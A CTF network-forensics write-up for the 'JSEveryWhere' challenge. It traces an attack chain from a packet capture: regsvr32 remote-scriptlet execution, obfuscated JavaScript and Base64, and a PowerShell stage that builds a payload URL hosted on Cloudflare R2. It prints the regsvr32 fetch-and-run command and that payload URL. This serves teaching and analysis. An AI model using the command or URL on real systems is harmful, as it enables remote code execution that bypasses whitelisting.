# 🕵️ FlagY – Network Forensics Write-Up  
**Challenge:** JSEveryWhere  
**Category:** Network Forensics / Malware Analysis    
**Flag format:** `FlagY{}`

---

## 📌 Challenge Description

A packet capture taken from a compromised network was provided for analysis.  
The goal was to identify the attack chain, understand the malicious behavior, and recover the hidden flag.

---

## 🔎 1. Initial PCAP Analysis

The capture file was analyzed using **Wireshark**:

```bash
wireshark JSEveryWhere.pcapng
```
**Observations**

>Traffic is mainly HTTP

>Two internal IP addresses are notable:

   >Victim: 172.168.40.106

   >Suspicious server: 172.168.40.39

Repeated requests from the victim:
```vbnet
GET /mse.sct HTTP/1.1
Host: 172.168.40.39:8000
```

Server response:
```pgsql
HTTP/1.1 200 OK
Content-Type: text/scriptlet
```
🚩 `.sct` files are **Windows Scriptlet files**, commonly abused in LOLBin attacks.

## ⚙️ 2. LOLBin Execution (regsvr32 Abuse)

Windows allows execution of remote scriptlets using:
```bash
regsvr32.exe /s /n /u /i:http://host/mse.sct scrobj.dll
```
This technique:

>Uses legitimate signed binaries

>Bypasses application whitelisting

>Is frequently used by real-world malware (IcedID, QakBot, etc.)

✅ This confirms living-off-the-land execution.

## 🧬 3. Extracting the Scriptlet

Using Wireshark:
```arduino
Right-click → Follow → HTTP Stream
```
The `.sct` file contains obfuscated JavaScript.

**Characteristics**

>Heavy string concatenation

>Unusual delimiter: ԥ

>Large Base64-looking blobs

Example:
```js
var data = "UwB0AGEA...==ԥUwB0AGU...==";
```

This suggests multi-stage payload reconstruction.

## 🧩 4. JavaScript Deobfuscation
**Step 1 – Reconstruct Payload**

>Split the string using `ԥ`

>Concatenate all parts

**Step 2 – Base64 Decode**

After decoding, the output is UTF-16LE, a strong indicator of PowerShell:
```bash
base64 -d payload.txt | iconv -f UTF-16LE
```

## 💣 5. PowerShell Stage Analysis

The decoded PowerShell script performs:

>String reversal

>Dynamic URL generation

>Remote payload reference

Example:
```powershell
$u = "txt.ayaya/ved.2r.cc5b569d51d0c186724e908554285ee-bup//:sptth"
$u = -join ($u.ToCharArray() | [array]::Reverse())
```

Reversed result:
```bash
https://pub-ee582455809e427681c0d15d9645b5cc.r2.dev/ayaya.txt
```

📌 Payload hosting via Cloudflare R2, a common modern attacker tactic.

## 🏁 6. Flag Extraction

Inside the PowerShell script, the flag is directly embedded:
```bash
$flag = "FlagY{4d783*******************************}"
```
## 🔗 7. Full Attack Chain

| Stage          | Technique                |
| -------------- | ------------------------ |
| Initial Access | regsvr32 LOLBin          |
| Script Type    | Windows Scriptlet (.sct) |
| Obfuscation    | JavaScript + Base64      |
| Execution      | PowerShell (UTF-16LE)    |
| Hosting        | Cloudflare R2            |
| Evasion        | Legitimate binaries      |
| Flag Location  | Embedded PowerShell      |

> ⚠️ **Note on Responsible Disclosure**
>
> In respect of the **FlagYard platform rules** and the effort invested by its authors to provide **high-quality challenges**, I am **not sharing the flag directly** in this repository.
>
> This write-up is provided **for educational purposes only**.  
> Please take the time to **understand each step**, reproduce the analysis yourself, and **learn from the reversing techniques used**.
>
> Do **not** treat this as a copy-paste solution.
>
> **CTRL+C ❌ CTRL+V ❌**  
> **Reverse, analyze, and learn instead.**

